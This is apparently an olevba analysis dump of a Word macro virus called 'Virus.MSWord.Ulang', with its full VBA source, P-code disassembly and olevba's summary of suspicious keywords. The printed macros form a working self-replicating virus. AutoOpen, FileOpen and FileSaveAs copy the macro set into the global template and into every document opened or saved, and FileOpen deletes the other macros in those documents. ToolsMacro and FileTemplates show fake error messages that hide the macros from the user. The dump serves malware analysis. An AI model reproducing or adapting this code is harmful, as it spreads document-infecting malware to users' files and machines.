olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ulang
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: ./Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.DisableAutoMacros
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim NFile$
Dim NMakro$
NFile$ = WordBasic.[FileName$]()
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy NMakro$, "Global:FileMacro"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: ./Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim TotalMacro
Dim i
Dim MN$
Dim FN$
Dim NFile$
Dim NMakro$
ReDim BadMacro__$(20)
WordBasic.DisableAutoMacros 1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
On Error GoTo -1: On Error GoTo Akhir
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
TotalMacro = 0
For i = 1 To WordBasic.CountMacros(1)
    MN$ = WordBasic.[MacroName$](i, 1)
    BadMacro__$(i) = MN$
    TotalMacro = TotalMacro + 1
Next i
FN$ = WordBasic.[FileName$]()
If TotalMacro >= 1 Then
    For i = 1 To TotalMacro
        On Error GoTo -1: On Error GoTo Akhir
        WordBasic.Organizer Delete:=1, Source:=FN$, Name:=BadMacro__$(i), Tab:=3
    Next i
WordBasic.FileSave
End If
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy "Global:FileMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", NMakro$
Akhir:
WordBasic.FileSave
WordBasic.DisableAutoMacros 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: ./Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Anti Macro Virus"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim Lakukan
Dim NFile$
Dim NMakro$
WordBasic.FileSave
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
Lakukan = WordBasic.Dialog.FileSaveAs(dlg)
If Lakukan Then
    dlg.Format = 1
    WordBasic.FileSaveAs dlg
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy "Global:FileMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", NMakro$
End If
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: ./Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Anti Macro Virus"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
Dim Pesan$
Pesan$ = "Template is not aveliable"
    WordBasic.MsgBox Pesan$, "Microsoft Word", 16
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileMacro.bas 
in file: ./Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/FileMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: ./Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
Dim Pesan$
Pesan$ = "No such macro or command"
    WordBasic.MsgBox Pesan$, "NdeKlaimber Macro Err ##", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsCustomize.bas 
in file: ./Virus.MSWord.Ulang - OLE stream: 'Macros/VBA/ToolsCustomize'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Ulang
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoExec - 876 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #3:
' 	EndSub 
' Macros/VBA/AutoOpen - 2566 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn NFile
' Line #3:
' 	Dim 
' 	VarDefn NMakro
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #6:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	St NMakro$ 
' Line #7:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #9:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #10:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #12:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St NMakro$ 
' Line #13:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #15:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St NMakro$ 
' Line #16:
' 	Ld NMakro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #18:
' 	Ld NFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #19:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #21:
' 	Ld NFile$ 
' 	LitStr 0x000E ":FileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #22:
' 	Ld NMakro$ 
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #24:
' 	Ld NFile$ 
' 	LitStr 0x000A ":FileMacro"
' 	Add 
' 	St NMakro$ 
' Line #25:
' 	Ld NMakro$ 
' 	LitStr 0x0010 "Global:FileMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #27:
' 	Ld NFile$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #28:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #29:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #30:
' 	Ld NFile$ 
' 	LitStr 0x000F ":ToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #31:
' 	Ld NMakro$ 
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	Label Akhir 
' Line #33:
' 	EndSub 
' Macros/VBA/FileOpen - 3861 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn TotalMacro
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn MN
' Line #5:
' 	Dim 
' 	VarDefn FN
' Line #6:
' 	Dim 
' 	VarDefn NFile
' Line #7:
' 	Dim 
' 	VarDefn NMakro
' Line #8:
' 	OptionBase 
' 	LitDI2 0x0014 
' 	Redim BadMacro__$ 0x0001 (As String)
' Line #9:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #10:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #12:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #13:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #14:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #15:
' 	LitDI2 0x0000 
' 	St TotalMacro 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #17:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St MN$ 
' Line #18:
' 	Ld MN$ 
' 	Ld i 
' 	ArgsSt BadMacro__$ 0x0001 
' Line #19:
' 	Ld TotalMacro 
' 	LitDI2 0x0001 
' 	Add 
' 	St TotalMacro 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St FN$ 
' Line #22:
' 	Ld TotalMacro 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TotalMacro 
' 	For 
' Line #24:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #25:
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld FN$ 
' 	ParamNamed Source 
' 	Ld i 
' 	ArgsLd BadMacro__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0004 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #30:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	St NMakro$ 
' Line #31:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #33:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #34:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #35:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #36:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St NMakro$ 
' Line #37:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #38:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #39:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St NMakro$ 
' Line #40:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #41:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #42:
' 	Ld NFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #43:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #44:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #45:
' 	Ld NFile$ 
' 	LitStr 0x000E ":FileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #46:
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #47:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #48:
' 	Ld NFile$ 
' 	LitStr 0x000A ":FileMacro"
' 	Add 
' 	St NMakro$ 
' Line #49:
' 	LitStr 0x0010 "Global:FileMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #50:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #51:
' 	Ld NFile$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #52:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #53:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #54:
' 	Ld NFile$ 
' 	LitStr 0x000F ":ToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #55:
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #56:
' 	Label Akhir 
' Line #57:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #58:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #59:
' 	EndSub 
' Macros/VBA/FileSave - 671 bytes
' Macros/VBA/FileSaveAs - 2879 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Lakukan
' Line #3:
' 	Dim 
' 	VarDefn NFile
' Line #4:
' 	Dim 
' 	VarDefn NMakro
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #6:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	St Lakukan 
' Line #9:
' 	Ld Lakukan 
' 	IfBlock 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #13:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	St NMakro$ 
' Line #14:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #16:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #17:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #19:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St NMakro$ 
' Line #20:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #22:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St NMakro$ 
' Line #23:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #25:
' 	Ld NFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #26:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #28:
' 	Ld NFile$ 
' 	LitStr 0x000E ":FileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #29:
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #31:
' 	Ld NFile$ 
' 	LitStr 0x000A ":FileMacro"
' 	Add 
' 	St NMakro$ 
' Line #32:
' 	LitStr 0x0010 "Global:FileMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #34:
' 	Ld NFile$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #35:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #37:
' 	Ld NFile$ 
' 	LitStr 0x000F ":ToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #38:
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Label Akhir 
' Line #41:
' 	EndSub 
' Macros/VBA/FileTemplates - 1207 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Pesan
' Line #3:
' 	LitStr 0x0019 "Template is not aveliable"
' 	St Pesan$ 
' Line #4:
' 	Ld Pesan$ 
' 	LitStr 0x000E "Microsoft Word"
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #5:
' 	EndSub 
' Macros/VBA/FileMacro - 672 bytes
' Macros/VBA/ToolsMacro - 1341 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Pesan
' Line #3:
' 	LitStr 0x0018 "No such macro or command"
' 	St Pesan$ 
' Line #4:
' 	Ld Pesan$ 
' 	LitStr 0x0018 "NdeKlaimber Macro Err ##"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #5:
' 	EndSub 
' Macros/VBA/ToolsCustomize - 677 bytes
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

